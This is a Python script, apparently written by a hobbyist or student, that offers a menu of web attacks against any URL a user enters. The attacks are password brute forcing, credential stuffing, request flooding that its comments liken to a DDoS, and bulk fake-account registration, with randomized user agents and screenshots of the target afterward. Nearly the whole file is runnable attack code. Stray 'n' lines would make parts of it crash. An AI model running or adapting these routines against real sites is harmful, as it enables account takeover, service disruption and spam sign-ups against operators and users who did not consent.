
#My weird libraries that I don't know what they do
import requests
import aiohttp
import asyncio
from faker import Faker
import time
from pyppeteer import launch #shout out to Joseph for this one, it's a headless browser, which is cool
from fake_useragent import UserAgent # i assume this is to randomize the user agent, which is a curated list of user agents
import os

fake = Faker()
ua = UserAgent()


# ---------------- Screenshot Function ---------------- The point of this is to take a screenshot of the website after the attack, really just stalker syndrome.
#async def take_screenshot(url, path="screenshot.png"):
 #   """Captures a screenshot and saves it locally."""
  #  browser = await launch(headless=True, args=['--no-sandbox'])
   # page = await browser.newPage()
    #await page.goto(url)
    #await page.screenshot({'path': path})
    #await browser.close()

    #print(f"📸 Screenshot saved as: {path}")

async def take_screenshot(url, path=None):
    """Captures a screenshot and saves it locally in the same directory as the script."""
    # Get the directory of the current Python script
    script_dir = os.path.dirname(os.path.realpath(__file__))

    # If no path is provided, set the default screenshot path to the current directory, which is the python directory location, i assume this might work. i have ran this online, but this needs to be tested on the actual machine.
    if path is None:
        path = os.path.join(script_dir, "screenshot.png")

    # Launch browser
    browser = await launch(headless=True, args=['--no-sandbox'])
    page = await browser.newPage()
    await page.goto(url)
    await page.screenshot({'path': path})
    await browser.close()

    print(f"📸 Screenshot saved as: {path}")
    n
    
# ---------------- Random User-Agent Function ----------------
def get_user_agent(randomize=True):
    """Returns a random User-Agent if randomize=True, otherwise a fixed one."""
    if randomize:
        return ua.random  # Random User-Agent from fake_useragent
    else:
        # Fixed User-Agent (can be changed), yes but for this instance, don't we all love outdated Chrome browsers?
        return "Mozilla/5.0 (Windows NTMK 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"


# ---------------- Bot Functions ----------------
def brute_force_sim(randomize_user_agent):
    print("\n[Brute Force Login Simulator]")
    url = input("Enter target login URL: ")
    username = input("Username to test: ")
    wordlist = ["1234", "admin", "password", "letmein"] # I know this is a bad wordlist, but it's just a simulation.

    headers = {"User-Agent": get_user_agent(randomize_user_agent)}

    for password in wordlist:
        response = requests.post(url,
                                 data={
                                     "username": username,
                                     "password": password
                                 },
                                 headers=headers)
        print(f"Trying {password}... Response Code: {response.status_code}")
        if "Welcome" in response.text:
            print(f"✅ Password found: {password}")
            break
    asyncio.run(take_screenshot(url))


def credential_stuffing(randomize_user_agent):
    print("\n[Credential Stuffing]")
    url = input("Enter target login URL: ")
    credentials = [("admin", "1234"), ("user", "password"), ("guest", "guest")] 
    # I know this is a bad wordlist, but it's just a simulation.

    headers = {"User-Agent": get_user_agent(randomize_user_agent)}

    for username, password in credentials:
        r = requests.post(url,
                          data={
                              "username": username,
                              "password": password
                          },
                          headers=headers)
        print(f"Trying {username}:{password}... Status: {r.status_code}")
        if "Welcome" in r.text:
            print(f"✅ Valid credentials: {username}:{password}")
            break
    asyncio.run(take_screenshot(url))


async def flood_endpoint(url,
                         method="GET",
                         data=None,
                         count=20,
                         randomize_user_agent=True):
    headers = {"User-Agent": get_user_agent(randomize_user_agent)}

    async with aiohttp.ClientSession() as session: #basically calling the library
        for i in range(count):
            if method.upper() == "POST":
                async with session.post(url, data=data,
                                        headers=headers) as resp:
                    print(f"[{i+1}] POST {url} → Status: {resp.status}")
            else:
                async with session.get(url, headers=headers) as resp:
                    print(f"[{i+1}] GET {url} → Status: {resp.status}")
    await take_screenshot(url, f"flood_{int(time.time())}.png")


def request_flood(randomize_user_agent):
    print("\n[Web Request Flooder]") #This is the part where you can flood a website with requests, it's like a DDoS attack but not really. I am just using this to hit the traffic constantly. Maybe this might work with API's, who knows?
    url = input("Enter URL to flood: ")
    method = input("Method [GET/POST] (default GET): ") or "GET"
    count = int(input("Number of requests to send (e.g. 20): "))
    data = None
    if method.upper() == "POST":
        payload = input("Enter POST data (e.g. key=value&test=123): ")
        data = dict(x.split("=") for x in payload.split("&"))
    asyncio.run(
        flood_endpoint(url,
                       method=method,
                       data=data,
                       count=count,
                       randomize_user_agent=randomize_user_agent))
    n
    asyncio.run(take_screenshot(url))

def fake_account_creator(randomize_user_agent): #I need an endpoint and maybe once Sandeep has the login page sorted, I can harass the page with fake accounts.
    print("\n[Fake Account Creator]")
    url = input("Enter registration URL: ")
    headers = {"User-Agent": get_user_agent(randomize_user_agent)}

    for _ in range(3):
        data = {
            "username": fake.user_name(),
            "email": fake.email(),
            "password": "Password123"
        }
        r = requests.post(url, data=data, headers=headers)
        print(f"📝 Created: {data['username']} - Status: {r.status_code}")
    asyncio.run(take_screenshot(url))


# ---------------- Manish's Joke of a Script ---------------- I need a life L0l
def menu():
    randomize_user_agent = input(
        "Enable User-Agent randomization? (y/n): ").strip().lower() == 'y'

    while True:
        print("\n==== Welcome to Manish's Weekend ====")
        print("Kindly choose the lunacy you would like to witness:")
        print("1. Brute Force Login")
        print("2. Credential Stuffing")
        print("3. Request Flooder")
        print("4. Fake Account Creator")
        print("5. Endpoint Flood Simulator")  # Added option
        print("6. Exit")
        choice = input("Choose an option: ")

        if choice == '1':
            brute_force_sim(randomize_user_agent)
        elif choice == '2':
            credential_stuffing(randomize_user_agent)
        elif choice == '3':
            request_flood(randomize_user_agent)
        elif choice == '4':
            fake_account_creator(randomize_user_agent)
        elif choice == '5':
            request_flood(randomize_user_agent)  # Updated for endpoint flooding
        elif choice == '6':
            print("What a shame, the ruckus is far from over 🤡")
            break
        else:
            print("Please check for dyslexia.")


if __name__ == "__main__":
    menu()
